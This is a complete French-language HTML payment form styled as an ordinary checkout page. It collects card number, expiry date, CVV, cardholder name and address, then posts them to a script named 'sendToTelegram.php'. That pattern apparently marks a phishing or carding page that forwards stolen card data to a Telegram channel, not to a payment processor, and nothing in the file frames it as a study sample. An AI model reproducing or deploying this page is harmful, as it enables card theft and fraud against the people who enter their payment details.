<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Formulaire de Paiement</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f4;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .payment-form {
            background-color: #fff;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            width: 300px;
        }
        .payment-form h2 {
            margin-bottom: 20px;
            font-size: 24px;
            text-align: center;
        }
        .payment-form label {
            display: block;
            margin-bottom: 5px;
            font-weight: bold;
        }
        .payment-form input, .payment-form select {
            width: 100%;
            padding: 8px;
            margin-bottom: 15px;
            border: 1px solid #ccc;
            border-radius: 4px;
        }
        .payment-form button {
            width: 100%;
            padding: 10px;
            background-color: #28a745;
            color: #fff;
            border: none;
            border-radius: 4px;
            cursor: pointer;
        }
        .payment-form button:hover {
            background-color: #218838;
        }
        .error-message {
            color: red;
            font-size: 0.9em;
            display: none;
        }
    </style>
</head>
<body>
    <div class="payment-form">
        <h2>Paiement</h2>
        <form action="sendToTelegram.php" method="POST" onsubmit="return validateForm()">
            <label for="card_number">Numéro de carte :</label>
            <input type="text" id="card_number" name="card_number" placeholder="1234 5678 9012 3456" 
                   maxlength="16" pattern="\d{16}" required title="Veuillez entrer un numéro de carte valide (16 chiffres).">

            <label for="expiry_date">Date d'expiration :</label>
            <input type="text" id="expiry_date" name="expiry_date" placeholder="MM/AA" 
                   maxlength="5" pattern="\d{2}/\d{2}" required title="Veuillez entrer une date d'expiration valide (MM/AA).">

            <label for="cvv">CVV :</label>
            <input type="text" id="cvv" name="cvv" placeholder="123" 
                   maxlength="3" pattern="\d{3}" required title="Veuillez entrer un CVV valide (3 chiffres).">

            <label for="card_holder">Nom du titulaire :</label>
            <input type="text" id="card_holder" name="card_holder" placeholder="Jean Dupont" required>

            <label for="address">Adresse :</label>
            <input type="text" id="address" name="address" placeholder="123 Rue de l'Exemple" required>
            <div id="address-error" class="error-message">Veuillez entrer une adresse valide.</div>

            <label for="city">Ville :</label>
            <input type="text" id="city" name="city" placeholder="Paris" required>

            <label for="postal_code">Code postal :</label>
            <input type="text" id="postal_code" name="postal_code" placeholder="75001" required
                   pattern="\d{5}" title="Veuillez entrer un code postal valide (5 chiffres).">
            <div id="postal-code-error" class="error-message">Veuillez entrer un code postal valide.</div>

            <label for="country">Pays :</label>
            <select id="country" name="country" required>
                <option value="">Sélectionnez un pays</option>
                <option value="FR">France</option>
                <option value="BE">Belgique</option>
                <option value="CA">Canada</option>
                <option value="CH">Suisse</option>
            </select>

            <button type="submit">Payer</button>
        </form>
    </div>

    <script>
        function validateForm() {
            // Vérifier si l'adresse est valide (au moins 5 caractères)
            var address = document.getElementById('address').value;
            var addressError = document.getElementById('address-error');
            if (address.length < 5) {
                addressError.style.display = 'block';
                return false;
            } else {
                addressError.style.display = 'none';
            }

            // Vérifier si le code postal est valide (exactement 5 chiffres)
            var postalCode = document.getElementById('postal_code').value;
            var postalCodeError = document.getElementById('postal-code-error');
            if (!/^\d{5}$/.test(postalCode)) {
                postalCodeError.style.display = 'block';
                return false;
            } else {
                postalCodeError.style.display = 'none';
            }

            // Si tout est valide, le formulaire peut être soumis
            return true;
        }
    </script>
</body>
</html>

